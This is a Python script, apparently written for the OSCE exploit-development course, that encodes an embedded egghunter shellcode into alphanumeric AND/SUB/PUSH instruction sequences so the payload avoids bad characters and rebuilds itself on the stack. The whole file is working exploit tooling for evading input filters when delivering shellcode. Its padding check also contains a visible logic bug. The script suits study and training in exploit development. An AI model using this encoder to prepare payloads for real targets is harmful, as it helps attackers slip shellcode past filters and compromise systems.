#!/usr/bin/env python
# alpha numeric encoder for shellcode using 1 register zerooing it and subtracting only good chars to assemble shellcode on the stack.
# This encoder was made for the OSCE course by 0x90 and B0x41S
# use for testing purposes only

from shellnoob import ShellNoob # used to disassemble asm to hex

sn = ShellNoob(flag_intel=True)

#This is the shellcode we are going to encode and the register we have available to do this
shellcode = (
    r"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
register = "EAX"
badchars = ["00","40"]

def check_len(shell):# a check if the length of the shellcode is divisable in blocks of 4 bytes
    if len(shell) / 4 % 4 != 0:
        NofP = 4 - (len(shell) / 4 % 4 != 0)
        print("Shellcode not divisible by 4 padding with " + str(NofP) + " Nops")
        shell += r"\x90" * NofP
    print("Shellcode is a correct multiple of 4")
    return shell

def remove(shellcode):# remove "' and \x from shellcode to get a hexadecimal string without formatting
    shellcode = shellcode.replace("\\x", "")
    shellcode = shellcode.replace("'", "")
    shellcode = shellcode.replace('"', "")
    return shellcode

def reverse(hexstring):
    hexbyte1 = hexstring[0] + hexstring[1]
    hexbyte2 = hexstring[2] + hexstring[3]
    hexbyte3 = hexstring[4] + hexstring[5]
    hexbyte4 = hexstring[6] + hexstring[7]
    newhex = hexbyte4 + hexbyte3 + hexbyte2 + hexbyte1
    return newhex

def split(hexstring):
    hexbyte1 = hexstring[0] + hexstring[1]
    hexbyte2 = hexstring[2] + hexstring[3]
    hexbyte3 = hexstring[4] + hexstring[5]
    hexbyte4 = hexstring[6] + hexstring[7]
    hexbyte5 = hexstring[8] + hexstring[9]
    return hexbyte2, hexbyte3, hexbyte4, hexbyte5

def calc(hexvalue1, hexvalue2):
    revhex = hexvalue1
    if hexvalue2 == "wrap":
        intofhex = int(revhex, 16)  # Make int to be able to calculate
        zeroMin = 0 - intofhex & 0xFFFFFFFF  # Make the clock go round
        zeroMin = "0x" + hex(zeroMin)[2:].zfill(8)
        return zeroMin
    else:
        intofhex1 = int(hexvalue1, 16)  # Make int to be able to calculate
        intofhex2 = int(hexvalue2, 16)
        diff = intofhex1 - intofhex2 & 0xFF  # Make the clock go round
        diff = "0x" + hex(diff)[2:]
        return diff

def sub(values):
    retvalue = []
    for i in values:
        hex7c = int('0x7c', 16)
        hexchar = int(i, 16)
        if hexchar == 0:
            hexchar += 100
            retvalue += '0x7c', '0x7c', '0x08'
        elif hexchar == 1:
            hexchar += 101
            retvalue += '0x7c', '0x84', '0x01'
        elif hexchar <= hex7c:
            nextsub = '0x01'
            hexchar = hexchar - 0x02  # deze nog aanpassen ivm 0
            hexchar = "0x" + hex(hexchar)[2:].zfill(2)
            retvalue += hexchar, nextsub, nextsub
        elif hexchar >= hex7c * 2:
            remainder = hexchar - (hex7c + hex7c)
            remainder = "0x" + hex(remainder)[2:].zfill(2)
            hex7c = hex(hex7c)
            retvalue += hex7c, hex7c, remainder

        else:
            remainder = hexchar - hex7c - 0x01
            remainder = "0x" + hex(remainder)[2:].zfill(2)
            hex7c = hex(hex7c)
            retvalue += hex7c, remainder, '0x01'

    # This whole piece must be smarter !!
    # In case of a 00 we must change some values
    if values[0] == "00":
        pass  # print("first value")
    if values[1] == "00":
        retvalue[0] = calc(retvalue[0], '0x01')
    if values[2] == "00":
        retvalue[3] = calc(retvalue[3], '0x01')
    if values[3] == "00":
        pass  # print("fourth value")
    if values[3] == "01":
         retvalue[6] = calc(retvalue[6], '0x01')
    return retvalue

def test(chunks):
    intofhex1 = int(chunks[0], 16)
    intofhex2 = int(chunks[1], 16)
    intofhex3 = int(chunks[2], 16)
    test = hex(0 - intofhex1 - intofhex2 - intofhex3 & 0xFFFFFFFF)
    result = "0x" + test[2:].zfill(8)
    return result

def strip(ugly):
    n = 2
    nice = [ugly[index: index + n] for index in range(0, len(ugly), n)]
    nice = "".join(nice[1::2])
    nice = nice.upper()
    return nice

def subtable(retvalue):
    nice = []
    chunk1 = retvalue[0:3][0] + retvalue[3:6][0] + retvalue[6:9][0] + retvalue[9:12][0]
    chunk2 = retvalue[0:3][1] + retvalue[3:6][1] + retvalue[6:9][1] + retvalue[9:12][1]
    chunk3 = retvalue[0:3][2] + retvalue[3:6][2] + retvalue[6:9][2] + retvalue[9:12][2]
    nice.append(strip(chunk1))
    nice.append(strip(chunk2))
    nice.append(strip(chunk3))
    return nice

shellcode = check_len(shellcode)
print(shellcode)
n = 4 * 4

f = open("shellcode.txt", "w")
newshellcode = []
# Cut shellcode in pieces of 4 bytes
shellcode = [shellcode[i:i + n] for i in range(0, len(shellcode), n)]
print("\r\nThese are the chunks we need to encode:")
print("\r\n" + "----------------------------")
for i in shellcode:
    print(i)
print("----------------------------")
print("New instructions in file shellcode.txt")
f.write("#We use register " + register + "\r\n")
f.write("#First zero-out " + register + "\r\n")

newshellcode.append(sn.asm_to_hex('and %eax, 0x554E4D4A'))
f.write("AND " + register + ", 0x554E4D4A" + "\r\n")

newshellcode.append(sn.asm_to_hex('and %eax, 0x2A313235'))
f.write("AND " + register + ", 0x2A313235" + "\r\n")
f.write("#Then set " + register + " to StackPointer" + "\r\n")

newshellcode.append(sn.asm_to_hex('push %esp'))
f.write("PUSH ESP" + "\r\n")

newshellcode.append(sn.asm_to_hex('pop %' + register))
f.write("POP " + register + "\r\n")
f.write("#Then create space on the stack for encoded shellcode, in this case 253 bytes" + "\r\n")

newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x55554D66"))
newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x55554B66"))
newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x5555506A"))
f.write("SUB " + register + ", 0x55554D66" + "\r\n")  # creating space on the stack where the encoded shellcode ends Here 253 bytes but one can only know in the end.
f.write("SUB  " + register + ", 0x55554B66" + "\r\n")
f.write("SUB " + register + ", 0x5555506A" + "\r\n")

newshellcode.append(sn.asm_to_hex('push %' + register))
newshellcode.append(sn.asm_to_hex('pop %esp'))
f.write("PUSH " + register + "\r\n")
f.write("POP ESP" + "\r\n")
f.write("#Now we write the encoded egghunter to the stack" + "\r\n")

for i in shellcode:
    shellcode = str(i)
    loosevalues = []
    hexclean = remove(shellcode)  # Remove slashes etc
    revhex = reverse(hexclean)  # Reverse the string endianess
    hexzeroMin = calc(revhex, "wrap")
    loosevalues = split(hexzeroMin)
    chunks = sub(loosevalues)
    newchunks = subtable(chunks)

    newshellcode.append(sn.asm_to_hex("AND %" + register + ", 0x554E4D4A"))
    newshellcode.append(sn.asm_to_hex("AND %" + register + ", 0x2A313235"))
    newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x" + newchunks[0]))
    newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x" + newchunks[1]))
    newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x" + newchunks[2]))
    newshellcode.append(sn.asm_to_hex("PUSH %" + register))

    f.write("AND " + register + ", 0x554E4D4A" + "\r\n")
    f.write("AND " + register + ", 0x2A313235" + "\r\n")
    f.write("SUB " + register + ", 0x" + newchunks[0] + "\r\n")
    f.write("SUB " + register + ", 0x" + newchunks[1] + "\r\n")
    f.write("SUB " + register + ", 0x" + newchunks[2] + "\r\n")
    f.write("PUSH " + register + "\r\n")

    if not str(test(newchunks)) == str("0x" + revhex):
        print("This is not good ...")
        print("0x" + revhex)
        print(str(test(newchunks)))
        exit()

f.close()
l = "".join(newshellcode)

step = 2
newshellcode = []

while step < len(l):
    hex = "\\x" + str(l[step - 2:step])
    newshellcode.append(hex)
    step += 2

print('\r\nNew Shellcode:\r\nShellcode=("' + "".join(newshellcode) + '")')
